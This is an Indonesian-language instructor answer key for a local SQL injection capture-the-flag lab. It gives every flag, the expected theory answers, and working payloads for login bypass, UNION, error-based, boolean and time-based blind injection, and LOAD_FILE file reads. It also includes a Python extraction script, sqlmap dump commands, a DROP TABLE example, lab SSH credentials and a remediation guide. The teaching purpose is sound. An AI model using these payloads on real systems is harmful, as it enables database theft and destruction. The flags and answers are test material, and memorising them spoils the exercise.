# 🏴‍☠️ SQL Injection CTF Lab — Panduan Lengkap
## Basic Penetration Testing Course

---

## 📋 Informasi Lab

| Item | Detail |
|------|--------|
| **Nama Lab** | SQL Injection CTF Lab |
| **Kelas** | Basic Penetration Testing |
| **Target OS** | Ubuntu 24.04 LTS (Docker) |
| **Jumlah Challenge** | 6 Challenges |
| **Jumlah Flag** | 8 Flags |
| **Total Poin** | 800 Points |
| **Durasi** | 3-4 Jam |
| **Tools yang Dibutuhkan** | Browser, Burp Suite/OWASP ZAP, sqlmap, curl |

---

## 🚀 Cara Menjalankan Lab

```bash
# Clone atau extract lab files
cd ctf-sqli-lab/

# Build dan jalankan Docker
docker-compose up -d --build

# Akses web application
# Browser: http://localhost:8080
# SSH:     ssh ctfadmin@localhost -p 2222 (password: dvwa2024!)
```

### Verifikasi Lab Berjalan
```bash
docker ps
curl http://localhost:8080
```

---

## 🎯 Daftar Flag

| # | Flag | Challenge | Difficulty | Points |
|---|------|-----------|------------|--------|
| 1 | `FLAG{sql1_l0g1n_byp4ss_succ3ss}` | Login Bypass | Easy | 100 |
| 2 | `FLAG{un10n_b4s3d_d4t4b4s3_3xpl0r3r}` | Product Catalog | Medium | 150 |
| 3 | `FLAG{t4bl3_enum3r4t10n_m4st3r}` | Product Catalog | Medium | - |
| 4 | `FLAG{c0lumn_3xtr4ct10n_pr0}` | Product Catalog | Medium | - |
| 5 | `FLAG{d4t4_3xf1ltr4t10n_c0mpl3t3}` | Product Catalog | Hard | - |
| 6 | `FLAG{bl1nd_sql1_d4t4_3xtr4ct3d}` | Employee Directory | Medium | 150 |
| 7 | `FLAG{3rr0r_b4s3d_1nj3ct10n_w1n}` | News Portal | Easy | 100 |
| 8 | `FLAG{s3rv3r_c0nf1g_3xp0s3d}` | Advanced Search | Hard | 200 |
| 9 | `FLAG{l04d_f1l3_vuln3r4b1l1ty}` | Advanced Search | Hard | - |
| 10 | `FLAG{7h3_h1dd3n_us3r_fl4g_2024}` | SSH + Privilege Escalation | Hard | 200 |
| 11 | `FLAG{r00t_4cc3ss_0bt41n3d_2024}` | Root Access | Hard | - |

---

## 📝 SOAL DAN JAWABAN LENGKAP

---

### 📌 CHALLENGE 1: Login Bypass (Easy — 100 pts)

**🔗 URL:** `http://localhost:8080/challenges/login.php`
**🎯 Teknik:** SQL Injection Authentication Bypass

#### Soal 1.1 (Teori — 10 pts)
**Pertanyaan:** Jelaskan apa yang dimaksud dengan SQL Injection pada mekanisme autentikasi login. Bagaimana serangan ini bisa memanipulasi query SQL?

**Jawaban yang Diharapkan:**
SQL Injection pada autentikasi login adalah teknik serangan dimana penyerang menyisipkan kode SQL berbahaya ke dalam input form login (username/password) yang langsung dimasukkan ke dalam query SQL tanpa sanitasi. Contohnya, query `SELECT * FROM users WHERE username='INPUT' AND password='INPUT'` bisa dimanipulasi dengan input `admin'--` sehingga kondisi password diabaikan dan penyerang berhasil login tanpa mengetahui password yang benar.

#### Soal 1.2 (Praktik — 20 pts)
**Pertanyaan:** Lakukan SQL injection pada form login untuk masuk sebagai user `admin`. Screenshot halaman setelah berhasil login dan tuliskan payload yang digunakan.

**Jawaban:**
**Payload pada field username:**
```
admin'-- 
```
atau
```
admin' OR '1'='1'-- 
```
**Payload pada field password:** (bisa dikosongkan atau isi apapun)

**Penjelasan:**
Query yang dihasilkan menjadi:
```sql
SELECT * FROM users WHERE username='admin'-- ' AND password=MD5('apapun')
```
Bagian setelah `--` menjadi komentar sehingga kondisi password diabaikan.

#### Soal 1.3 (Praktik — 30 pts)
**Pertanyaan:** Temukan flag yang tersembunyi di dalam tabel users. Tuliskan flag tersebut dan jelaskan langkah-langkah yang dilakukan.

**Jawaban:**
**Flag:** `FLAG{sql1_l0g1n_byp4ss_succ3ss}`

**Langkah-langkah:**
1. Masukkan payload `' OR 1=1--` di field username
2. Login berhasil sebagai user pertama (admin)
3. Setelah login sebagai admin, sistem menampilkan semua data user
4. Pada tabel users, terlihat entry dengan full_name = `FLAG{sql1_l0g1n_byp4ss_succ3ss}`

Alternatif: Login langsung sebagai FLAG_USER:
```
Username: FLAG_USER'-- 
Password: (apapun)
```

#### Soal 1.4 (Teori — 10 pts)
**Pertanyaan:** Sebutkan minimal 3 cara untuk mencegah SQL Injection pada form login!

**Jawaban yang Diharapkan:**
1. **Prepared Statements / Parameterized Queries** — Menggunakan placeholder (`?`) sehingga input user diperlakukan sebagai data, bukan kode SQL
2. **Input Validation & Sanitization** — Memfilter karakter spesial seperti `'`, `"`, `--`, `;` dari input user
3. **Least Privilege Database** — Database user hanya diberikan akses minimum yang diperlukan
4. **WAF (Web Application Firewall)** — Menggunakan firewall aplikasi untuk mendeteksi dan memblokir pattern SQLi
5. **Stored Procedures** — Menggunakan stored procedure yang telah didefinisikan di database

---

### 📌 CHALLENGE 2: Product Catalog — UNION-Based SQLi (Medium — 150 pts)

**🔗 URL:** `http://localhost:8080/challenges/products.php`
**🎯 Teknik:** UNION-Based SQL Injection

#### Soal 2.1 (Praktik — 15 pts)
**Pertanyaan:** Tentukan jumlah kolom yang digunakan dalam query products. Tuliskan teknik dan payload yang digunakan.

**Jawaban:**
**Teknik:** ORDER BY enumeration

**Payload (di parameter category):**
```
' ORDER BY 1-- ✓ (tidak error)
' ORDER BY 2-- ✓
' ORDER BY 3-- ✓
' ORDER BY 4-- ✓
' ORDER BY 5-- ✓
' ORDER BY 6-- ✓
' ORDER BY 7-- ✗ (error!)
```

**Kesimpulan:** Query menggunakan **6 kolom**.

URL lengkap:
```
http://localhost:8080/challenges/products.php?category=' ORDER BY 6--&sort=name
```

#### Soal 2.2 (Praktik — 20 pts)
**Pertanyaan:** Gunakan UNION SELECT untuk menampilkan versi database, nama database, dan current user. Screenshot hasilnya.

**Jawaban:**
**Payload:**
```
' UNION SELECT 1,version(),database(),user(),5,6--
```

**URL:**
```
http://localhost:8080/challenges/products.php?category=' UNION SELECT 1,version(),database(),user(),5,6--&sort=name
```

**Hasil yang diharapkan:**
- version() = `10.x.x-MariaDB` (versi MariaDB)
- database() = `ctf_company`
- user() = `ctfuser@localhost`

#### Soal 2.3 (Praktik — 25 pts)
**Pertanyaan:** Enumerasi semua tabel yang ada dalam database `ctf_company`. Sebutkan semua nama tabel yang ditemukan.

**Jawaban:**
**Payload:**
```
' UNION SELECT 1,table_name,3,4,5,6 FROM information_schema.tables WHERE table_schema='ctf_company'--
```

**Tabel yang ditemukan:**
1. `users`
2. `products`
3. `secret_flags`
4. `employees`
5. `admin_credentials`
6. `articles`
7. `feedback`

**Flag:** `FLAG{t4bl3_enum3r4t10n_m4st3r}` (dari tabel secret_flags)

#### Soal 2.4 (Praktik — 30 pts)
**Pertanyaan:** Ekstrak semua flag dari tabel `secret_flags`. Tuliskan semua flag yang berhasil didapatkan.

**Jawaban:**
**Payload:**
```
' UNION SELECT 1,flag_name,flag_value,4,difficulty,6 FROM secret_flags--
```

**URL:**
```
http://localhost:8080/challenges/products.php?category=' UNION SELECT 1,flag_name,flag_value,4,difficulty,6 FROM secret_flags--&sort=name
```

**Flags yang didapatkan:**
| Flag Name | Flag Value | Difficulty |
|-----------|-----------|------------|
| Database Discovery | `FLAG{un10n_b4s3d_d4t4b4s3_3xpl0r3r}` | Easy |
| Table Explorer | `FLAG{t4bl3_enum3r4t10n_m4st3r}` | Medium |
| Column Digger | `FLAG{c0lumn_3xtr4ct10n_pr0}` | Medium |
| Data Exfiltration | `FLAG{d4t4_3xf1ltr4t10n_c0mpl3t3}` | Hard |
| File Reader | `FLAG{l04d_f1l3_vuln3r4b1l1ty}` | Hard |

#### Soal 2.5 (Teori — 10 pts)
**Pertanyaan:** Jelaskan perbedaan antara UNION-based SQLi dan Error-based SQLi. Kapan masing-masing teknik paling efektif digunakan?

**Jawaban yang Diharapkan:**

**UNION-based SQLi:**
- Menggunakan operator UNION untuk menggabungkan hasil query penyerang dengan query asli
- Efektif ketika hasil query ditampilkan di halaman web
- Membutuhkan jumlah kolom yang sama dengan query asli
- Bisa mengekstrak banyak data sekaligus

**Error-based SQLi:**
- Memanfaatkan pesan error database yang ditampilkan ke user
- Efektif ketika error MySQL/database ditampilkan di halaman
- Menggunakan fungsi seperti EXTRACTVALUE(), UPDATEXML(), atau subquery error
- Data diekstrak melalui pesan error (biasanya terbatas panjangnya)

---

### 📌 CHALLENGE 3: Employee Directory — Blind SQLi (Medium — 150 pts)

**🔗 URL:** `http://localhost:8080/challenges/employees.php`
**🎯 Teknik:** Boolean-Based Blind SQL Injection

#### Soal 3.1 (Teori — 10 pts)
**Pertanyaan:** Jelaskan apa yang dimaksud dengan Blind SQL Injection dan perbedaannya dengan SQL Injection biasa (in-band). Mengapa disebut "blind"?

**Jawaban yang Diharapkan:**
Blind SQL Injection adalah teknik SQLi dimana penyerang tidak bisa melihat langsung output dari query yang diinjeksikan. Disebut "blind" karena tidak ada data yang ditampilkan secara langsung. Penyerang harus mengandalkan respons boolean (true/false berdasarkan perubahan tampilan halaman) atau time-based (perbedaan waktu respons). Berbeda dengan in-band SQLi dimana data langsung terlihat di halaman web.

#### Soal 3.2 (Praktik — 25 pts)
**Pertanyaan:** Buktikan bahwa parameter search rentan terhadap Boolean-based Blind SQLi. Tunjukkan perbedaan respons antara kondisi TRUE dan FALSE.

**Jawaban:**

**Kondisi TRUE (menampilkan hasil):**
```
http://localhost:8080/challenges/employees.php?search=Ahmad' AND 1=1-- 
```
→ Hasil: Data karyawan Ahmad ditampilkan

**Kondisi FALSE (tidak menampilkan hasil):**
```
http://localhost:8080/challenges/employees.php?search=Ahmad' AND 1=2-- 
```
→ Hasil: "Employee NOT FOUND"

**Kesimpulan:** Perbedaan respons membuktikan parameter rentan terhadap Boolean-based Blind SQLi.

#### Soal 3.3 (Praktik — 35 pts)
**Pertanyaan:** Ekstrak flag dari tabel employees menggunakan teknik Blind SQLi. Jelaskan proses karakter per karakter yang dilakukan (minimal 5 karakter pertama) dan tuliskan flag lengkapnya.

**Jawaban:**

**Teknik:** SUBSTRING karakter per karakter

**Proses ekstraksi (kolom position_title dari EMP006):**
```
# Karakter ke-1: F
?search=Ahmad' AND SUBSTRING((SELECT position_title FROM employees WHERE emp_id='EMP006'),1,1)='F'-- 
→ TRUE (data muncul)

# Karakter ke-2: L  
?search=Ahmad' AND SUBSTRING((SELECT position_title FROM employees WHERE emp_id='EMP006'),2,1)='L'-- 
→ TRUE

# Karakter ke-3: A
?search=Ahmad' AND SUBSTRING((SELECT position_title FROM employees WHERE emp_id='EMP006'),3,1)='A'-- 
→ TRUE

# Karakter ke-4: G
?search=Ahmad' AND SUBSTRING((SELECT position_title FROM employees WHERE emp_id='EMP006'),4,1)='G'-- 
→ TRUE

# Karakter ke-5: {
?search=Ahmad' AND SUBSTRING((SELECT position_title FROM employees WHERE emp_id='EMP006'),5,1)='{'-- 
→ TRUE
```

**Flag lengkap:** `FLAG{bl1nd_sql1_d4t4_3xtr4ct3d}`

**Alternatif menggunakan sqlmap:**
```bash
sqlmap -u "http://localhost:8080/challenges/employees.php?search=test" \
  --technique=B --dump -T employees -C position_title \
  --where="emp_id='EMP006'"
```

#### Soal 3.4 (Praktik — 20 pts)
**Pertanyaan:** Tulis script Python sederhana untuk mengotomasi ekstraksi flag menggunakan Blind SQLi.

**Jawaban:**
```python
import requests

url = "http://localhost:8080/challenges/employees.php"
flag = ""
charset = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789{}_!@#"

for i in range(1, 50):
    found = False
    for c in charset:
        payload = f"Ahmad' AND SUBSTRING((SELECT position_title FROM employees WHERE emp_id='EMP006'),{i},1)='{c}'-- "
        r = requests.get(url, params={"search": payload})
        
        if "EMP001" in r.text:  # TRUE condition - data muncul
            flag += c
            print(f"[+] Char {i}: {c} → Flag so far: {flag}")
            found = True
            break
    
    if not found:
        print(f"[*] Selesai di posisi {i}")
        break

print(f"\n[FLAG] {flag}")
```

---

### 📌 CHALLENGE 4: News Portal — Error-Based SQLi (Easy — 100 pts)

**🔗 URL:** `http://localhost:8080/challenges/articles.php`
**🎯 Teknik:** Error-Based SQL Injection

#### Soal 4.1 (Praktik — 15 pts)
**Pertanyaan:** Identifikasi tipe injeksi pada parameter `id`. Tunjukkan bahwa parameter ini rentan dengan bukti error message dari database.

**Jawaban:**

**Test error:**
```
http://localhost:8080/challenges/articles.php?id=1'
```
→ Error: `You have an error in your SQL syntax...`

Parameter `id` adalah integer-based (tanpa quotes) sehingga langsung bisa diinjeksi.

**Test boolean:**
```
?id=1 AND 1=1  → Artikel muncul (TRUE)
?id=1 AND 1=2  → Artikel tidak muncul (FALSE)
```

#### Soal 4.2 (Praktik — 30 pts)
**Pertanyaan:** Gunakan EXTRACTVALUE() atau teknik error-based lainnya untuk mengekstrak nama semua tabel dalam database. Tuliskan payload dan hasilnya.

**Jawaban:**

**Payload menggunakan EXTRACTVALUE:**
```
?id=1 AND EXTRACTVALUE(1,CONCAT(0x7e,(SELECT GROUP_CONCAT(table_name) FROM information_schema.tables WHERE table_schema=database())))
```

**Hasil error message:**
```
XPATH syntax error: '~admin_credentials,articles,emplo...'
```

**Untuk melihat lengkap (gunakan LIMIT):**
```
?id=1 AND EXTRACTVALUE(1,CONCAT(0x7e,(SELECT table_name FROM information_schema.tables WHERE table_schema=database() LIMIT 0,1)))
→ ~admin_credentials

?id=1 AND EXTRACTVALUE(1,CONCAT(0x7e,(SELECT table_name FROM information_schema.tables WHERE table_schema=database() LIMIT 4,1)))
→ ~secret_flags
```

#### Soal 4.3 (Praktik — 30 pts)
**Pertanyaan:** Ekstrak flag dari tabel `admin_credentials`. Tuliskan step-by-step payload yang digunakan.

**Jawaban:**

**Step 1: Enumerasi kolom**
```
?id=1 AND EXTRACTVALUE(1,CONCAT(0x7e,(SELECT GROUP_CONCAT(column_name) FROM information_schema.columns WHERE table_name='admin_credentials')))
```
→ `~id,admin_user,admin_hash,access_level,last_login,secret_note`

**Step 2: Ekstrak secret_note**
```
?id=1 AND EXTRACTVALUE(1,CONCAT(0x7e,(SELECT secret_note FROM admin_credentials LIMIT 0,1)))
```
→ `~FLAG{3rr0r_b4s3d_1nj3ct10n_w1n}`

**Flag:** `FLAG{3rr0r_b4s3d_1nj3ct10n_w1n}`

#### Soal 4.4 (Teori — 10 pts)
**Pertanyaan:** Mengapa error-based SQLi bisa dianggap berbahaya meskipun "hanya" menampilkan pesan error? Apa risiko keamanan dari menampilkan error database ke pengguna?

**Jawaban yang Diharapkan:**
Error-based SQLi berbahaya karena pesan error database bisa mengungkap informasi sensitif seperti: nama tabel, nama kolom, versi database, path file server, dan bahkan data actual dari database. Menampilkan error ke pengguna melanggar prinsip "least information disclosure". Dalam produksi, pesan error harus di-log secara internal dan hanya pesan generic yang ditampilkan ke user (contoh: "An error occurred, please try again").

---

### 📌 CHALLENGE 5: Advanced Search — Multi-Point Injection (Hard — 200 pts)

**🔗 URL:** `http://localhost:8080/challenges/search_advanced.php`
**🎯 Teknik:** Multiple Injection Points, LOAD_FILE

#### Soal 5.1 (Praktik — 20 pts)
**Pertanyaan:** Identifikasi semua parameter yang rentan pada halaman Advanced Search. Jelaskan masing-masing parameter dan jenis kerentanannya.

**Jawaban:**

| Parameter | Jenis Kerentanan | Contoh Eksploitasi |
|-----------|-----------------|-------------------|
| `q` (keyword) | String-based SQLi (dalam LIKE) | `' UNION SELECT ...--` |
| `table` | Table name injection (tanpa quotes) | `secret_flags` langsung sebagai table name |
| `order` | ORDER BY injection | `ASC; DROP TABLE--` (stacked query) |
| `limit` | Integer injection (tanpa quotes) | `10 UNION SELECT ...` |

#### Soal 5.2 (Praktik — 30 pts)
**Pertanyaan:** Gunakan parameter `table` untuk langsung mengakses tabel `secret_flags` tanpa menggunakan UNION. Tuliskan payload dan screenshot hasilnya.

**Jawaban:**

**Payload sederhana — ganti table name:**
```
http://localhost:8080/challenges/search_advanced.php?q=&table=secret_flags&order=ASC&limit=10
```

Karena keyword kosong, query menjadi:
```sql
SELECT * FROM secret_flags WHERE name LIKE '%%' ...
```

Ini akan error karena kolom `name` tidak ada di `secret_flags`. Jadi gunakan wildcard:
```
?q=FLAG&table=secret_flags-- &order=ASC&limit=10
```

Atau gunakan subquery:
```
?q=a&table=(SELECT * FROM secret_flags) AS t&order=ASC&limit=10
```

#### Soal 5.3 (Praktik — 40 pts)
**Pertanyaan:** Gunakan fungsi `LOAD_FILE()` untuk membaca file `/etc/ctf_flag.conf` dari server. Tuliskan payload lengkap dan flag yang ditemukan.

**Jawaban:**

**Payload:**
```
http://localhost:8080/challenges/search_advanced.php?q=' UNION SELECT 1,LOAD_FILE('/etc/ctf_flag.conf'),3,4,5,6,7,8-- &table=products&order=ASC&limit=10
```

**Catatan:** Jumlah kolom untuk tabel products bisa berbeda karena `SELECT *`, jadi perlu disesuaikan. Coba dengan jumlah kolom yang sesuai.

**Flag:** `FLAG{s3rv3r_c0nf1g_3xp0s3d}`

**Bonus — Baca /etc/passwd:**
```
?q=' UNION SELECT 1,LOAD_FILE('/etc/passwd'),3,4,5,6,7,8-- &table=products
```

#### Soal 5.4 (Teori — 15 pts)
**Pertanyaan:** Jelaskan mengapa fungsi `LOAD_FILE()` bisa bekerja dalam konteks SQL Injection. Apa kondisi/konfigurasi yang diperlukan agar serangan ini berhasil?

**Jawaban yang Diharapkan:**
`LOAD_FILE()` berhasil karena beberapa kondisi terpenuhi:
1. **FILE privilege** — Database user (`ctfuser`) diberikan privilege FILE yang memungkinkan membaca file dari filesystem server
2. **secure_file_priv** — Konfigurasi MySQL `secure_file_priv` tidak membatasi direktori yang bisa diakses, atau file target berada dalam direktori yang diizinkan
3. **File permissions** — File target memiliki permission read untuk user yang menjalankan MySQL daemon
4. **No WAF/IDS** — Tidak ada firewall aplikasi yang memblokir LOAD_FILE dalam query

Pencegahan: Jangan berikan FILE privilege ke database user aplikasi, set `secure_file_priv` ke direktori spesifik, dan gunakan parameterized queries.

---

### 📌 CHALLENGE 6: Feedback Form — Time-Based Blind SQLi (Hard — 200 pts)

**🔗 URL:** `http://localhost:8080/challenges/feedback.php`
**🎯 Teknik:** Time-Based Blind SQL Injection

#### Soal 6.1 (Teori — 10 pts)
**Pertanyaan:** Jelaskan perbedaan antara Boolean-based Blind SQLi dan Time-based Blind SQLi. Kapan Time-based lebih tepat digunakan?

**Jawaban yang Diharapkan:**

**Boolean-based:** Mengandalkan perbedaan respons halaman (konten berbeda, status code berbeda) untuk menentukan TRUE/FALSE. Lebih cepat karena tidak perlu menunggu delay.

**Time-based:** Mengandalkan perbedaan waktu respons menggunakan fungsi seperti `SLEEP()` atau `BENCHMARK()`. Digunakan ketika:
- Tidak ada perbedaan tampilan halaman antara TRUE dan FALSE
- Respons selalu sama regardless of query result (contoh: INSERT query yang selalu menampilkan "Success")
- Cocok untuk INSERT, UPDATE, DELETE statements dimana output tidak terlihat

#### Soal 6.2 (Praktik — 30 pts)
**Pertanyaan:** Buktikan bahwa parameter `rating` rentan terhadap Time-based Blind SQLi. Tunjukkan proof-of-concept dengan mengukur perbedaan waktu respons.

**Jawaban:**

**Test 1 — Normal (tanpa delay):**
```bash
time curl -X POST http://localhost:8080/challenges/feedback.php \
  -d "name=test&email=test@test.com&subject=test&message=test&rating=5"
```
→ Respons: ~0.1 detik

**Test 2 — Dengan SLEEP(3):**
```bash
time curl -X POST http://localhost:8080/challenges/feedback.php \
  -d "name=test&email=test@test.com&subject=test&message=test&rating=5) AND SLEEP(3)-- -"
```
→ Respons: ~3.1 detik (delay 3 detik)

**Kesimpulan:** Delay 3 detik membuktikan SLEEP() tereksekusi, parameter `rating` rentan terhadap Time-based Blind SQLi.

#### Soal 6.3 (Praktik — 40 pts)
**Pertanyaan:** Ekstrak flag dari tabel `admin_credentials` kolom `secret_note` menggunakan Time-based Blind SQLi. Tuliskan teknik dan flag yang didapatkan.

**Jawaban:**

**Payload untuk mengekstrak karakter per karakter:**
```bash
# Karakter ke-1 = 'F'?
curl -X POST http://localhost:8080/challenges/feedback.php \
  -d "name=test&email=t@t.com&subject=t&message=t&rating=5) AND IF(SUBSTRING((SELECT secret_note FROM admin_credentials LIMIT 0,1),1,1)='F',SLEEP(3),0)-- -"
# → Delay 3 detik = TRUE, karakter pertama adalah 'F'

# Karakter ke-2 = 'L'?
...rating=5) AND IF(SUBSTRING((SELECT secret_note FROM admin_credentials LIMIT 0,1),2,1)='L',SLEEP(3),0)-- -"
# → Delay 3 detik = TRUE
```

**Menggunakan sqlmap (lebih efisien):**
```bash
sqlmap -u "http://localhost:8080/challenges/feedback.php" \
  --data="name=test&email=test@test.com&subject=test&message=test&rating=5" \
  -p rating \
  --technique=T \
  --dump -T admin_credentials -C secret_note
```

**Flag:** `FLAG{3rr0r_b4s3d_1nj3ct10n_w1n}`

#### Soal 6.4 (Praktik — 25 pts)
**Pertanyaan:** Parameter GET `rating` pada filter feedback list juga rentan. Gunakan UNION-based injection pada parameter ini untuk mengekstrak data dari tabel `admin_credentials`. Tuliskan payload.

**Jawaban:**

**Payload:**
```
http://localhost:8080/challenges/feedback.php?rating=5 UNION SELECT admin_user,admin_hash,secret_note,access_level,last_login FROM admin_credentials-- 
```

Hasilnya akan menampilkan data admin_credentials di bagian "Recent Feedback" list.

---

## 🔧 BONUS CHALLENGES

### Bonus 1: Reconnaissance (Info Gathering)

**Pertanyaan:** Lakukan reconnaissance pada web server. Temukan file atau informasi yang seharusnya tidak tersedia secara publik. Tuliskan semua temuan.

**Jawaban:**

1. **robots.txt** — `http://localhost:8080/robots.txt`
   - Mengungkap path sensitif: `/config/`, `/backup/`, `/admin-panel/`, `/phpinfo.php`
   - Memberikan hint tentang lokasi database credentials

2. **phpinfo.php** — `http://localhost:8080/phpinfo.php`
   - Mengungkap versi PHP, konfigurasi server, environment variables
   - Informasi path server internal

3. **Database config** — Source code di `/config/database.php` (path terlihat di debug query)
   - Credentials: `ctfuser:ctfpass123`
   - Database name: `ctf_company`

### Bonus 2: SSH & Post-Exploitation

**Pertanyaan:** Setelah mendapatkan credentials dari database, coba akses SSH dan temukan flag di filesystem server.

**Jawaban:**

```bash
# SSH login (dari informasi yang didapat)
ssh ctfadmin@localhost -p 2222
# Password: dvwa2024!

# Cari flag files
find / -name "*flag*" -type f 2>/dev/null

# Flag di home directory
cat /home/ctfadmin/.flag_user.txt
# → FLAG{7h3_h1dd3n_us3r_fl4g_2024}

# Flag di /etc (readable)
cat /etc/ctf_flag.conf
# → FLAG{s3rv3r_c0nf1g_3xp0s3d}

# Root flag (butuh privilege escalation)
# cat /root/.secret_flag.txt → Permission denied
# → FLAG{r00t_4cc3ss_0bt41n3d_2024}
```

---

## 📊 RUBRIK PENILAIAN

| Komponen | Bobot | Kriteria |
|----------|-------|----------|
| Flag Submission | 40% | Setiap flag bernilai poin sesuai difficulty |
| Write-up / Laporan | 30% | Dokumentasi langkah-langkah lengkap dengan screenshot |
| Jawaban Teori | 15% | Pemahaman konsep SQL Injection |
| Script/Automasi | 10% | Membuat script untuk automasi eksploitasi |
| Bonus | 5% | Reconnaissance dan post-exploitation |

### Skala Nilai:

| Nilai | Poin | Keterangan |
|-------|------|------------|
| A | 85-100% | Menyelesaikan semua challenge + bonus |
| B | 70-84% | Menyelesaikan 4-5 challenge |
| C | 55-69% | Menyelesaikan 2-3 challenge |
| D | 40-54% | Menyelesaikan 1 challenge |
| E | <40% | Tidak menyelesaikan challenge |

---

## 🛡️ REMEDIATION GUIDE

### Kode yang Rentan vs Kode yang Aman

**❌ Rentan (Seperti di Lab):**
```php
$query = "SELECT * FROM users WHERE username='$username' AND password=MD5('$password')";
$result = $conn->query($query);
```

**✅ Aman (Prepared Statement):**
```php
$stmt = $conn->prepare("SELECT * FROM users WHERE username=? AND password=MD5(?)");
$stmt->bind_param("ss", $username, $password);
$stmt->execute();
$result = $stmt->get_result();
```

### Checklist Keamanan:
- [ ] Gunakan Prepared Statements untuk semua query
- [ ] Validasi dan sanitasi semua input
- [ ] Matikan tampilan error di production
- [ ] Terapkan principle of least privilege pada database user
- [ ] Gunakan WAF untuk deteksi SQLi patterns
- [ ] Regular security audit dan penetration testing
- [ ] Update dan patch database secara berkala

---

*Dokumen ini merupakan bagian dari materi kelas Basic Penetration Testing. Gunakan lab ini hanya untuk tujuan edukasi.*
